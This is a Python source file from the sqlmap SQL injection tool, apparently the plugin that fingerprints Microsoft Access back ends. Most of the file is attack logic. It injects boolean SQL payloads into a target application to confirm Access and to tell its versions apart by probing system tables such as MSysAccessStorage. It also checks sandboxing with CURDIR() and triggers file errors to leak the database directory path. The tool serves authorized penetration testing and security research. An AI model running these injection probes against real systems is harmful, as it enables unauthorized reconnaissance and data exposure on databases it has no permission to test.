#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import re

from lib.core.agent import agent
from lib.core.common import formatDBMSfp
from lib.core.common import formatFingerprint
from lib.core.common import getHtmlErrorFp
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.common import wasLastRequestDBMSError
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.session import setDbms
from lib.core.settings import ACCESS_ALIASES
from lib.request.connect import Connect as Request

from plugins.generic.fingerprint import Fingerprint as GenericFingerprint

class Fingerprint(GenericFingerprint):
    def __init__(self):
        GenericFingerprint.__init__(self)

    def __sandBoxCheck(self):
        # Reference: http://milw0rm.com/papers/198
        retVal = None
        table = None
        if kb.dbmsVersion and len(kb.dbmsVersion) > 0:
            if kb.dbmsVersion[0] in ("97", "2000"):
                table = "MSysAccessObjects"
            elif kb.dbmsVersion[0] in ("2002-2003", "2007"):
                table = "MSysAccessStorage"
            if table:
                query   = agent.prefixQuery("AND EXISTS(SELECT CURDIR() FROM %s)" % table)
                query   = agent.suffixQuery(query)
                payload = agent.payload(newValue=query)
                result  = Request.queryPage(payload)
                retVal = "not sandboxed" if result else "sandboxed"

        return retVal

    def __sysTablesCheck(self):
        infoMsg = "executing system table(s) existance fingerprint"
        logger.info(infoMsg)

        # Microsoft Access table reference updated on 01/2010
        sysTables = { 
                        "97":           ("MSysModules2", "MSysAccessObjects"),
                        "2000" :        ("!MSysModules2", "MSysAccessObjects"),
                        "2002-2003" :   ("MSysAccessStorage", "!MSysNavPaneObjectIDs"),
                        "2007" :        ("MSysAccessStorage", "MSysNavPaneObjectIDs")
                    }
        # MSysAccessXML is not a reliable system table because it doesn't always exist
        # ("Access through Access", p6, should be "normally doesn't exist" instead of "is normally empty")

        for version, tables in sysTables.items():
            exist = True
            for table in tables:
                negate = False
                if table[0] == '!':
                    negate = True
                    table = table[1:]
                randInt = randomInt()
                query   = agent.prefixQuery("AND EXISTS(SELECT * FROM %s WHERE %d=%d)" % (table, randInt, randInt))
                query   = agent.suffixQuery(query)
                payload = agent.payload(newValue=query)
                result  = Request.queryPage(payload)
                if result is None:
                    result = False
                if negate:
                    result = not result
                exist &= result
                if not exist:
                    break
            if exist:
                return version

        return None

    def __getDatabaseDir(self):
        retVal = None

        infoMsg = "searching for database directory"
        logger.info(infoMsg)

        randInt = randomInt()
        randStr = randomStr()
        query   = agent.prefixQuery("AND EXISTS(SELECT * FROM %s.%s WHERE %d=%d)" % (randStr, randStr, randInt, randInt))
        query   = agent.suffixQuery(query)
        payload = agent.payload(newValue=query)
        page  = Request.queryPage(payload, content=True)

        if wasLastRequestDBMSError():
            match = re.search("Could not find file\s+'([^']+?)'", page[0])

            if match:
                retVal = match.group(1).rstrip("%s.mdb" % randStr)

                if retVal.endswith('\\'):
                    retVal = retVal[:-1]

        return retVal

    def getFingerprint(self):
        value  = ""
        wsOsFp = formatFingerprint("web server", kb.headersFp)

        if wsOsFp:
            value += "%s\n" % wsOsFp

        if kb.data.banner:
            dbmsOsFp = formatFingerprint("back-end DBMS", kb.bannerFp)

            if dbmsOsFp:
                value += "%s\n" % dbmsOsFp

        value  += "back-end DBMS: "

        if not conf.extensiveFp:
            value += "Microsoft Access"
            return value

        actVer = formatDBMSfp() + " (%s)" % (self.__sandBoxCheck())
        blank  = " " * 15
        value += "active fingerprint: %s" % actVer

        if kb.bannerFp:
            banVer = kb.bannerFp["dbmsVersion"]

            if re.search("-log$", kb.data.banner):
                banVer += ", logging enabled"

            banVer = formatDBMSfp([banVer])
            value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)

        htmlErrorFp = getHtmlErrorFp()

        if htmlErrorFp:
            value += "\n%shtml error message fingerprint: %s" % (blank, htmlErrorFp)

        value += "\ndatabase directory: '%s'" % self.__getDatabaseDir()

        return value

    def checkDbms(self):
        if conf.dbms in ACCESS_ALIASES:
            setDbms(DBMS.ACCESS)

            if not conf.extensiveFp:
                return True

        logMsg = "testing Microsoft Access"
        logger.info(logMsg)

        payload = agent.fullPayload("AND VAL(CVAR(1))=1")
        result  = Request.queryPage(payload)

        if result:
            logMsg = "confirming Microsoft Access"
            logger.info(logMsg)

            payload = agent.fullPayload("AND IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0")
            result  = Request.queryPage(payload)

            if not result:
                warnMsg = "the back-end DBMS is not Microsoft Access"
                logger.warn(warnMsg)
                return False

            setDbms("Microsoft Access")

            if not conf.extensiveFp:
                return True

            kb.dbmsVersion = [self.__sysTablesCheck()]

            return True
        else:
            warnMsg = "the back-end DBMS is not Microsoft Access"
            logger.warn(warnMsg)

            return False

    def forceDbmsEnum(self):
        conf.db = "Access (*)"
